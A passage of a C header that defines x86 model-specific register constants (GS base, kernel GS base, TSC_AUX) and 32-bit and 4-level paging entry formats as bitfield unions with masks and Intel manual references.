      * Map of BASE Address of GS.
      *
      * @remarks If CPUID.80000001:EDX.[29] = 1
      */
#define IA32_GS_BASE                                                 0xC0000101

      /**
       * Swap Target of BASE Address of GS.
       *
       * @remarks If CPUID.80000001:EDX.[29] = 1
       */
#define IA32_KERNEL_GS_BASE                                          0xC0000102

       /**
        * Auxiliary TSC.
        *
        * @remarks If CPUID.80000001H: EDX[27] = 1 or CPUID.(EAX=7,ECX=0):ECX[bit 22] = 1
        */
#define IA32_TSC_AUX                                                 0xC0000103
typedef union
{
    struct
    {
        /**
         * [Bits 31:0] AUX. Auxiliary signature of TSC.
         */
        UINT64 TscAuxiliarySignature : 32;
#define IA32_TSC_AUX_TSC_AUXILIARY_SIGNATURE_BIT                     0
#define IA32_TSC_AUX_TSC_AUXILIARY_SIGNATURE_FLAG                    0xFFFFFFFF
#define IA32_TSC_AUX_TSC_AUXILIARY_SIGNATURE_MASK                    0xFFFFFFFF
#define IA32_TSC_AUX_TSC_AUXILIARY_SIGNATURE(_)                      (((_) >> 0) & 0xFFFFFFFF)
        UINT64 Reserved1 : 32;
    };

    UINT64 Flags;
} IA32_TSC_AUX_REGISTER;

/**
 * @}
 */

 /**
  * @defgroup PAGING \
  *           Paging
  * @{
  */
  /**
   * @defgroup PAGING_32 \
   *           32-Bit Paging
   *
   * A logical processor uses 32-bit paging if CR0.PG = 1 and CR4.PAE = 0. 32-bit paging translates 32-bit linear addresses
   * to 40-bit physical addresses. Although 40 bits corresponds to 1 TByte, linear addresses are limited to 32 bits; at most
   * 4 GBytes of linear-address space may be accessed at any given time.
   * 32-bit paging uses a hierarchy of paging structures to produce a translation for a linear address. CR3 is used to locate
   * the first paging-structure, the page directory. 32-bit paging may map linear addresses to either 4-KByte pages or
   * 4-MByte pages.
   *
   * @see Vol3A[4.5(4-LEVEL PAGING)] (reference)
   * @{
   */
   /**
    * @brief Format of a 32-Bit Page-Directory Entry that Maps a 4-MByte Page
    */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to map a 4-MByte page.
         */
        UINT32 Present : 1;
#define PDE_4MB_32_PRESENT_BIT                                       0
#define PDE_4MB_32_PRESENT_FLAG                                      0x01
#define PDE_4MB_32_PRESENT_MASK                                      0x01
#define PDE_4MB_32_PRESENT(_)                                        (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 4-MByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT32 Write : 1;
#define PDE_4MB_32_WRITE_BIT                                         1
#define PDE_4MB_32_WRITE_FLAG                                        0x02
#define PDE_4MB_32_WRITE_MASK                                        0x01
#define PDE_4MB_32_WRITE(_)                                          (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 4-MByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT32 Supervisor : 1;
#define PDE_4MB_32_SUPERVISOR_BIT                                    2
#define PDE_4MB_32_SUPERVISOR_FLAG                                   0x04
#define PDE_4MB_32_SUPERVISOR_MASK                                   0x01
#define PDE_4MB_32_SUPERVISOR(_)                                     (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the 4-MByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT32 PageLevelWriteThrough : 1;
#define PDE_4MB_32_PAGE_LEVEL_WRITE_THROUGH_BIT                      3
#define PDE_4MB_32_PAGE_LEVEL_WRITE_THROUGH_FLAG                     0x08
#define PDE_4MB_32_PAGE_LEVEL_WRITE_THROUGH_MASK                     0x01
#define PDE_4MB_32_PAGE_LEVEL_WRITE_THROUGH(_)                       (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the 4-MByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT32 PageLevelCacheDisable : 1;
#define PDE_4MB_32_PAGE_LEVEL_CACHE_DISABLE_BIT                      4
#define PDE_4MB_32_PAGE_LEVEL_CACHE_DISABLE_FLAG                     0x10
#define PDE_4MB_32_PAGE_LEVEL_CACHE_DISABLE_MASK                     0x01
#define PDE_4MB_32_PAGE_LEVEL_CACHE_DISABLE(_)                       (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Accessed; indicates whether software has accessed the 4-MByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT32 Accessed : 1;
#define PDE_4MB_32_ACCESSED_BIT                                      5
#define PDE_4MB_32_ACCESSED_FLAG                                     0x20
#define PDE_4MB_32_ACCESSED_MASK                                     0x01
#define PDE_4MB_32_ACCESSED(_)                                       (((_) >> 5) & 0x01)

        /**
         * [Bit 6] Dirty; indicates whether software has written to the 4-MByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT32 Dirty : 1;
#define PDE_4MB_32_DIRTY_BIT                                         6
#define PDE_4MB_32_DIRTY_FLAG                                        0x40
#define PDE_4MB_32_DIRTY_MASK                                        0x01
#define PDE_4MB_32_DIRTY(_)                                          (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Page size; must be 1 (otherwise, this entry references a page table).
         */
        UINT32 LargePage : 1;
#define PDE_4MB_32_LARGE_PAGE_BIT                                    7
#define PDE_4MB_32_LARGE_PAGE_FLAG                                   0x80
#define PDE_4MB_32_LARGE_PAGE_MASK                                   0x01
#define PDE_4MB_32_LARGE_PAGE(_)                                     (((_) >> 7) & 0x01)

        /**
         * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored otherwise.
         *
         * @see Vol3A[4.10(Caching Translation Information)]
         */
        UINT32 Global : 1;
#define PDE_4MB_32_GLOBAL_BIT                                        8
#define PDE_4MB_32_GLOBAL_FLAG                                       0x100
#define PDE_4MB_32_GLOBAL_MASK                                       0x01
#define PDE_4MB_32_GLOBAL(_)                                         (((_) >> 8) & 0x01)

        /**
         * [Bits 11:9] Ignored.
         */
        UINT32 Ignored1 : 3;
#define PDE_4MB_32_IGNORED_1_BIT                                     9
#define PDE_4MB_32_IGNORED_1_FLAG                                    0xE00
#define PDE_4MB_32_IGNORED_1_MASK                                    0x07
#define PDE_4MB_32_IGNORED_1(_)                                      (((_) >> 9) & 0x07)

        /**
         * [Bit 12] Indirectly determines the memory type used to access the 4-MByte page referenced by this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT32 Pat : 1;
#define PDE_4MB_32_PAT_BIT                                           12
#define PDE_4MB_32_PAT_FLAG                                          0x1000
#define PDE_4MB_32_PAT_MASK                                          0x01
#define PDE_4MB_32_PAT(_)                                            (((_) >> 12) & 0x01)

        /**
         * [Bits 20:13] Bits (M-1):32 of physical address of the 4-MByte page referenced by this entry.
         */
        UINT32 PageFrameNumberLow : 8;
#define PDE_4MB_32_PAGE_FRAME_NUMBER_LOW_BIT                         13
#define PDE_4MB_32_PAGE_FRAME_NUMBER_LOW_FLAG                        0x1FE000
#define PDE_4MB_32_PAGE_FRAME_NUMBER_LOW_MASK                        0xFF
#define PDE_4MB_32_PAGE_FRAME_NUMBER_LOW(_)                          (((_) >> 13) & 0xFF)
        UINT32 Reserved1 : 1;

        /**
         * [Bits 31:22] Bits 31:22 of physical address of the 4-MByte page referenced by this entry.
         */
        UINT32 PageFrameNumberHigh : 10;
#define PDE_4MB_32_PAGE_FRAME_NUMBER_HIGH_BIT                        22
#define PDE_4MB_32_PAGE_FRAME_NUMBER_HIGH_FLAG                       0xFFC00000
#define PDE_4MB_32_PAGE_FRAME_NUMBER_HIGH_MASK                       0x3FF
#define PDE_4MB_32_PAGE_FRAME_NUMBER_HIGH(_)                         (((_) >> 22) & 0x3FF)
    };

    UINT32 Flags;
} PDE_4MB_32;

/**
 * @brief Format of a 32-Bit Page-Directory Entry that References a Page Table
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to reference a page table.
         */
        UINT32 Present : 1;
#define PDE_32_PRESENT_BIT                                           0
#define PDE_32_PRESENT_FLAG                                          0x01
#define PDE_32_PRESENT_MASK                                          0x01
#define PDE_32_PRESENT(_)                                            (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 4-MByte region controlled by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT32 Write : 1;
#define PDE_32_WRITE_BIT                                             1
#define PDE_32_WRITE_FLAG                                            0x02
#define PDE_32_WRITE_MASK                                            0x01
#define PDE_32_WRITE(_)                                              (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 4-MByte region controlled by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT32 Supervisor : 1;
#define PDE_32_SUPERVISOR_BIT                                        2
#define PDE_32_SUPERVISOR_FLAG                                       0x04
#define PDE_32_SUPERVISOR_MASK                                       0x01
#define PDE_32_SUPERVISOR(_)                                         (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the page table referenced by this
         * entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT32 PageLevelWriteThrough : 1;
#define PDE_32_PAGE_LEVEL_WRITE_THROUGH_BIT                          3
#define PDE_32_PAGE_LEVEL_WRITE_THROUGH_FLAG                         0x08
#define PDE_32_PAGE_LEVEL_WRITE_THROUGH_MASK                         0x01
#define PDE_32_PAGE_LEVEL_WRITE_THROUGH(_)                           (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the page table referenced by this
         * entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT32 PageLevelCacheDisable : 1;
#define PDE_32_PAGE_LEVEL_CACHE_DISABLE_BIT                          4
#define PDE_32_PAGE_LEVEL_CACHE_DISABLE_FLAG                         0x10
#define PDE_32_PAGE_LEVEL_CACHE_DISABLE_MASK                         0x01
#define PDE_32_PAGE_LEVEL_CACHE_DISABLE(_)                           (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Accessed; indicates whether this entry has been used for linear-address translation.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT32 Accessed : 1;
#define PDE_32_ACCESSED_BIT                                          5
#define PDE_32_ACCESSED_FLAG                                         0x20
#define PDE_32_ACCESSED_MASK                                         0x01
#define PDE_32_ACCESSED(_)                                           (((_) >> 5) & 0x01)

        /**
         * [Bit 6] Ignored.
         */
        UINT32 Ignored1 : 1;
#define PDE_32_IGNORED_1_BIT                                         6
#define PDE_32_IGNORED_1_FLAG                                        0x40
#define PDE_32_IGNORED_1_MASK                                        0x01
#define PDE_32_IGNORED_1(_)                                          (((_) >> 6) & 0x01)

        /**
         * [Bit 7] If CR4.PSE = 1, must be 0 (otherwise, this entry maps a 4-MByte page); otherwise, ignored.
         */
        UINT32 LargePage : 1;
#define PDE_32_LARGE_PAGE_BIT                                        7
#define PDE_32_LARGE_PAGE_FLAG                                       0x80
#define PDE_32_LARGE_PAGE_MASK                                       0x01
#define PDE_32_LARGE_PAGE(_)                                         (((_) >> 7) & 0x01)

        /**
         * [Bits 11:8] Ignored.
         */
        UINT32 Ignored2 : 4;
#define PDE_32_IGNORED_2_BIT                                         8
#define PDE_32_IGNORED_2_FLAG                                        0xF00
#define PDE_32_IGNORED_2_MASK                                        0x0F
#define PDE_32_IGNORED_2(_)                                          (((_) >> 8) & 0x0F)

        /**
         * [Bits 31:12] Physical address of 4-KByte aligned page table referenced by this entry.
         */
        UINT32 PageFrameNumber : 20;
#define PDE_32_PAGE_FRAME_NUMBER_BIT                                 12
#define PDE_32_PAGE_FRAME_NUMBER_FLAG                                0xFFFFF000
#define PDE_32_PAGE_FRAME_NUMBER_MASK                                0xFFFFF
#define PDE_32_PAGE_FRAME_NUMBER(_)                                  (((_) >> 12) & 0xFFFFF)
    };

    UINT32 Flags;
} PDE_32;

/**
 * @brief Format of a 32-Bit Page-Table Entry that Maps a 4-KByte Page
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to map a 4-KByte page.
         */
        UINT32 Present : 1;
#define PTE_32_PRESENT_BIT                                           0
#define PTE_32_PRESENT_FLAG                                          0x01
#define PTE_32_PRESENT_MASK                                          0x01
#define PTE_32_PRESENT(_)                                            (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT32 Write : 1;
#define PTE_32_WRITE_BIT                                             1
#define PTE_32_WRITE_FLAG                                            0x02
#define PTE_32_WRITE_MASK                                            0x01
#define PTE_32_WRITE(_)                                              (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT32 Supervisor : 1;
#define PTE_32_SUPERVISOR_BIT                                        2
#define PTE_32_SUPERVISOR_FLAG                                       0x04
#define PTE_32_SUPERVISOR_MASK                                       0x01
#define PTE_32_SUPERVISOR(_)                                         (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the 4-KByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT32 PageLevelWriteThrough : 1;
#define PTE_32_PAGE_LEVEL_WRITE_THROUGH_BIT                          3
#define PTE_32_PAGE_LEVEL_WRITE_THROUGH_FLAG                         0x08
#define PTE_32_PAGE_LEVEL_WRITE_THROUGH_MASK                         0x01
#define PTE_32_PAGE_LEVEL_WRITE_THROUGH(_)                           (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the 4-KByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT32 PageLevelCacheDisable : 1;
#define PTE_32_PAGE_LEVEL_CACHE_DISABLE_BIT                          4
#define PTE_32_PAGE_LEVEL_CACHE_DISABLE_FLAG                         0x10
#define PTE_32_PAGE_LEVEL_CACHE_DISABLE_MASK                         0x01
#define PTE_32_PAGE_LEVEL_CACHE_DISABLE(_)                           (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Accessed; indicates whether software has accessed the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT32 Accessed : 1;
#define PTE_32_ACCESSED_BIT                                          5
#define PTE_32_ACCESSED_FLAG                                         0x20
#define PTE_32_ACCESSED_MASK                                         0x01
#define PTE_32_ACCESSED(_)                                           (((_) >> 5) & 0x01)

        /**
         * [Bit 6] Dirty; indicates whether software has written to the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT32 Dirty : 1;
#define PTE_32_DIRTY_BIT                                             6
#define PTE_32_DIRTY_FLAG                                            0x40
#define PTE_32_DIRTY_MASK                                            0x01
#define PTE_32_DIRTY(_)                                              (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Indirectly determines the memory type used to access the 4-KByte page referenced by this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT32 Pat : 1;
#define PTE_32_PAT_BIT                                               7
#define PTE_32_PAT_FLAG                                              0x80
#define PTE_32_PAT_MASK                                              0x01
#define PTE_32_PAT(_)                                                (((_) >> 7) & 0x01)

        /**
         * [Bit 8] Global; if CR4.PGE = 1, determines whether the translation is global; ignored otherwise.
         *
         * @see Vol3A[4.10(Caching Translation Information)]
         */
        UINT32 Global : 1;
#define PTE_32_GLOBAL_BIT                                            8
#define PTE_32_GLOBAL_FLAG                                           0x100
#define PTE_32_GLOBAL_MASK                                           0x01
#define PTE_32_GLOBAL(_)                                             (((_) >> 8) & 0x01)

        /**
         * [Bits 11:9] Ignored.
         */
        UINT32 Ignored1 : 3;
#define PTE_32_IGNORED_1_BIT                                         9
#define PTE_32_IGNORED_1_FLAG                                        0xE00
#define PTE_32_IGNORED_1_MASK                                        0x07
#define PTE_32_IGNORED_1(_)                                          (((_) >> 9) & 0x07)

        /**
         * [Bits 31:12] Physical address of 4-KByte aligned page table referenced by this entry.
         */
        UINT32 PageFrameNumber : 20;
#define PTE_32_PAGE_FRAME_NUMBER_BIT                                 12
#define PTE_32_PAGE_FRAME_NUMBER_FLAG                                0xFFFFF000
#define PTE_32_PAGE_FRAME_NUMBER_MASK                                0xFFFFF
#define PTE_32_PAGE_FRAME_NUMBER(_)                                  (((_) >> 12) & 0xFFFFF)
    };

    UINT32 Flags;
} PTE_32;

/**
 * @brief Format of a common Page-Table Entry
 */
typedef union
{
    struct
    {
        UINT32 Present : 1;
#define PT_ENTRY_32_PRESENT_BIT                                      0
#define PT_ENTRY_32_PRESENT_FLAG                                     0x01
#define PT_ENTRY_32_PRESENT_MASK                                     0x01
#define PT_ENTRY_32_PRESENT(_)                                       (((_) >> 0) & 0x01)
        UINT32 Write : 1;
#define PT_ENTRY_32_WRITE_BIT                                        1
#define PT_ENTRY_32_WRITE_FLAG                                       0x02
#define PT_ENTRY_32_WRITE_MASK                                       0x01
#define PT_ENTRY_32_WRITE(_)                                         (((_) >> 1) & 0x01)
        UINT32 Supervisor : 1;
#define PT_ENTRY_32_SUPERVISOR_BIT                                   2
#define PT_ENTRY_32_SUPERVISOR_FLAG                                  0x04
#define PT_ENTRY_32_SUPERVISOR_MASK                                  0x01
#define PT_ENTRY_32_SUPERVISOR(_)                                    (((_) >> 2) & 0x01)
        UINT32 PageLevelWriteThrough : 1;
#define PT_ENTRY_32_PAGE_LEVEL_WRITE_THROUGH_BIT                     3
#define PT_ENTRY_32_PAGE_LEVEL_WRITE_THROUGH_FLAG                    0x08
#define PT_ENTRY_32_PAGE_LEVEL_WRITE_THROUGH_MASK                    0x01
#define PT_ENTRY_32_PAGE_LEVEL_WRITE_THROUGH(_)                      (((_) >> 3) & 0x01)
        UINT32 PageLevelCacheDisable : 1;
#define PT_ENTRY_32_PAGE_LEVEL_CACHE_DISABLE_BIT                     4
#define PT_ENTRY_32_PAGE_LEVEL_CACHE_DISABLE_FLAG                    0x10
#define PT_ENTRY_32_PAGE_LEVEL_CACHE_DISABLE_MASK                    0x01
#define PT_ENTRY_32_PAGE_LEVEL_CACHE_DISABLE(_)                      (((_) >> 4) & 0x01)
        UINT32 Accessed : 1;
#define PT_ENTRY_32_ACCESSED_BIT                                     5
#define PT_ENTRY_32_ACCESSED_FLAG                                    0x20
#define PT_ENTRY_32_ACCESSED_MASK                                    0x01
#define PT_ENTRY_32_ACCESSED(_)                                      (((_) >> 5) & 0x01)
        UINT32 Dirty : 1;
#define PT_ENTRY_32_DIRTY_BIT                                        6
#define PT_ENTRY_32_DIRTY_FLAG                                       0x40
#define PT_ENTRY_32_DIRTY_MASK                                       0x01
#define PT_ENTRY_32_DIRTY(_)                                         (((_) >> 6) & 0x01)
        UINT32 LargePage : 1;
#define PT_ENTRY_32_LARGE_PAGE_BIT                                   7
#define PT_ENTRY_32_LARGE_PAGE_FLAG                                  0x80
#define PT_ENTRY_32_LARGE_PAGE_MASK                                  0x01
#define PT_ENTRY_32_LARGE_PAGE(_)                                    (((_) >> 7) & 0x01)
        UINT32 Global : 1;
#define PT_ENTRY_32_GLOBAL_BIT                                       8
#define PT_ENTRY_32_GLOBAL_FLAG                                      0x100
#define PT_ENTRY_32_GLOBAL_MASK                                      0x01
#define PT_ENTRY_32_GLOBAL(_)                                        (((_) >> 8) & 0x01)

        /**
         * [Bits 11:9] Ignored.
         */
        UINT32 Ignored1 : 3;
#define PT_ENTRY_32_IGNORED_1_BIT                                    9
#define PT_ENTRY_32_IGNORED_1_FLAG                                   0xE00
#define PT_ENTRY_32_IGNORED_1_MASK                                   0x07
#define PT_ENTRY_32_IGNORED_1(_)                                     (((_) >> 9) & 0x07)

        /**
         * [Bits 31:12] Physical address of the 4-KByte page referenced by this entry.
         */
        UINT32 PageFrameNumber : 20;
#define PT_ENTRY_32_PAGE_FRAME_NUMBER_BIT                            12
#define PT_ENTRY_32_PAGE_FRAME_NUMBER_FLAG                           0xFFFFF000
#define PT_ENTRY_32_PAGE_FRAME_NUMBER_MASK                           0xFFFFF
#define PT_ENTRY_32_PAGE_FRAME_NUMBER(_)                             (((_) >> 12) & 0xFFFFF)
    };

    UINT32 Flags;
} PT_ENTRY_32;

/**
 * @defgroup PAGING_STRUCTURES_ENTRY_COUNT_32 \
 *           Paging structures entry counts
 *
 * Paging structures entry counts.
 * @{
 */
#define PDE_ENTRY_COUNT_32                                           0x00000400
#define PTE_ENTRY_COUNT_32                                           0x00000400
 /**
  * @}
  */

  /**
   * @}
   */

   /**
    * @defgroup PAGING_64 \
    *           64-Bit (4-Level) Paging
    *
    * A logical processor uses 4-level paging if CR0.PG = 1, CR4.PAE = 1, and IA32_EFER.LME = 1. With 4-level paging, linear
    * address are translated using a hierarchy of in-memory paging structures located using the contents of CR3. 4-level
    * paging translates 48-bit linear addresses to 52-bit physical addresses. Although 52 bits corresponds to 4 PBytes, linear
    * addresses are limited to 48 bits; at most 256 TBytes of linear-address space may be accessed at any given time.
    * 4-level paging uses a hierarchy of paging structures to produce a translation for a linear address. CR3 is used to
    * locate the first paging-structure, the PML4 table. Use of CR3 with 4-level paging depends on whether processcontext
    * identifiers (PCIDs) have been enabled by setting CR4.PCIDE.
    *
    * @see Vol3A[4.5(4-LEVEL PAGING)] (reference)
    * @{
    */
    /**
     * @brief Format of a 4-Level PML4 Entry (PML4E) that References a Page-Directory-Pointer Table
     */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to reference a page-directory-pointer table.
         */
        UINT64 Present : 1;
#define PML4E_64_PRESENT_BIT                                         0
#define PML4E_64_PRESENT_FLAG                                        0x01
#define PML4E_64_PRESENT_MASK                                        0x01
#define PML4E_64_PRESENT(_)                                          (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 512-GByte region controlled by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Write : 1;
#define PML4E_64_WRITE_BIT                                           1
#define PML4E_64_WRITE_FLAG                                          0x02
#define PML4E_64_WRITE_MASK                                          0x01
#define PML4E_64_WRITE(_)                                            (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 512-GByte region controlled by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Supervisor : 1;
#define PML4E_64_SUPERVISOR_BIT                                      2
#define PML4E_64_SUPERVISOR_FLAG                                     0x04
#define PML4E_64_SUPERVISOR_MASK                                     0x01
#define PML4E_64_SUPERVISOR(_)                                       (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the page-directory-pointer table
         * referenced by this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelWriteThrough : 1;
#define PML4E_64_PAGE_LEVEL_WRITE_THROUGH_BIT                        3
#define PML4E_64_PAGE_LEVEL_WRITE_THROUGH_FLAG                       0x08
#define PML4E_64_PAGE_LEVEL_WRITE_THROUGH_MASK                       0x01
#define PML4E_64_PAGE_LEVEL_WRITE_THROUGH(_)                         (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the page-directory-pointer table
         * referenced by this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelCacheDisable : 1;
#define PML4E_64_PAGE_LEVEL_CACHE_DISABLE_BIT                        4
#define PML4E_64_PAGE_LEVEL_CACHE_DISABLE_FLAG                       0x10
#define PML4E_64_PAGE_LEVEL_CACHE_DISABLE_MASK                       0x01
#define PML4E_64_PAGE_LEVEL_CACHE_DISABLE(_)                         (((_) >> 4) & 0x01)

        /**
         * [Bit 5] Accessed; indicates whether this entry has been used for linear-address translation.
         *
         * @see Vol3A[4.8(Accessed and Dirty Flags)]
         */
        UINT64 Accessed : 1;
#define PML4E_64_ACCESSED_BIT                                        5
#define PML4E_64_ACCESSED_FLAG                                       0x20
#define PML4E_64_ACCESSED_MASK                                       0x01
#define PML4E_64_ACCESSED(_)                                         (((_) >> 5) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * [Bit 7] Reserved (must be 0).
         */
        UINT64 MustBeZero : 1;
#define PML4E_64_MUST_BE_ZERO_BIT                                    7
#define PML4E_64_MUST_BE_ZERO_FLAG                                   0x80
#define PML4E_64_MUST_BE_ZERO_MASK                                   0x01
#define PML4E_64_MUST_BE_ZERO(_)                                     (((_) >> 7) & 0x01)

        /**
         * [Bits 11:8] Ignored.
         */
        UINT64 Ignored1 : 4;
#define PML4E_64_IGNORED_1_BIT                                       8
#define PML4E_64_IGNORED_1_FLAG                                      0xF00
#define PML4E_64_IGNORED_1_MASK                                      0x0F
#define PML4E_64_IGNORED_1(_)                                        (((_) >> 8) & 0x0F)

        /**
         * [Bits 47:12] Physical address of 4-KByte aligned page-directory-pointer table referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define PML4E_64_PAGE_FRAME_NUMBER_BIT                               12
#define PML4E_64_PAGE_FRAME_NUMBER_FLAG                              0xFFFFFFFFF000
#define PML4E_64_PAGE_FRAME_NUMBER_MASK                              0xFFFFFFFFF
#define PML4E_64_PAGE_FRAME_NUMBER(_)                                (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved2 : 4;

        /**
         * [Bits 62:52] Ignored.
         */
        UINT64 Ignored2 : 11;
#define PML4E_64_IGNORED_2_BIT                                       52
#define PML4E_64_IGNORED_2_FLAG                                      0x7FF0000000000000
#define PML4E_64_IGNORED_2_MASK                                      0x7FF
#define PML4E_64_IGNORED_2(_)                                        (((_) >> 52) & 0x7FF)

        /**
         * [Bit 63] If IA32_EFER.NXE = 1, execute-disable (if 1, instruction fetches are not allowed from the 512-GByte region
         * controlled by this entry); otherwise, reserved (must be 0).
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 ExecuteDisable : 1;
#define PML4E_64_EXECUTE_DISABLE_BIT                                 63
#define PML4E_64_EXECUTE_DISABLE_FLAG                                0x8000000000000000
#define PML4E_64_EXECUTE_DISABLE_MASK                                0x01
#define PML4E_64_EXECUTE_DISABLE(_)                                  (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} PML4E_64;

/**
 * @brief Format of a 4-Level Page-Directory-Pointer-Table Entry (PDPTE) that Maps a 1-GByte Page
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Present; must be 1 to map a 1-GByte page.
         */
        UINT64 Present : 1;
#define PDPTE_1GB_64_PRESENT_BIT                                     0
#define PDPTE_1GB_64_PRESENT_FLAG                                    0x01
#define PDPTE_1GB_64_PRESENT_MASK                                    0x01
#define PDPTE_1GB_64_PRESENT(_)                                      (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Read/write; if 0, writes may not be allowed to the 1-GByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Write : 1;
#define PDPTE_1GB_64_WRITE_BIT                                       1
#define PDPTE_1GB_64_WRITE_FLAG                                      0x02
#define PDPTE_1GB_64_WRITE_MASK                                      0x01
#define PDPTE_1GB_64_WRITE(_)                                        (((_) >> 1) & 0x01)

        /**
         * [Bit 2] User/supervisor; if 0, user-mode accesses are not allowed to the 1-GByte page referenced by this entry.
         *
         * @see Vol3A[4.6(Access Rights)]
         */
        UINT64 Supervisor : 1;
#define PDPTE_1GB_64_SUPERVISOR_BIT                                  2
#define PDPTE_1GB_64_SUPERVISOR_FLAG                                 0x04
#define PDPTE_1GB_64_SUPERVISOR_MASK                                 0x01
#define PDPTE_1GB_64_SUPERVISOR(_)                                   (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Page-level write-through; indirectly determines the memory type used to access the 1-GByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelWriteThrough : 1;
#define PDPTE_1GB_64_PAGE_LEVEL_WRITE_THROUGH_BIT                    3
#define PDPTE_1GB_64_PAGE_LEVEL_WRITE_THROUGH_FLAG                   0x08
#define PDPTE_1GB_64_PAGE_LEVEL_WRITE_THROUGH_MASK                   0x01
#define PDPTE_1GB_64_PAGE_LEVEL_WRITE_THROUGH(_)                     (((_) >> 3) & 0x01)

        /**
         * [Bit 4] Page-level cache disable; indirectly determines the memory type used to access the 1-GByte page referenced by
         * this entry.
         *
         * @see Vol3A[4.9.2(Paging and Memory Typing When the PAT is Supported (Pentium III and More Recent Processor Families))]
         */
        UINT64 PageLevelCacheDisable : 1;
#define PDPTE_1GB_64_PAGE_LEVEL_CACHE_DISABLE_BIT                    4
#define PDPTE_1GB_64_PAGE_LEVEL_CACHE_DISABLE_FLAG                   0x10
#define PDPTE_1GB_64_PAGE_LEVEL_CACHE_DISABLE_MASK                   0x01
#define PDPTE_1GB_64_PAGE_LEVEL_CACHE_DISABLE(_)                     (((_) >> 4) & 0x01)

        /**
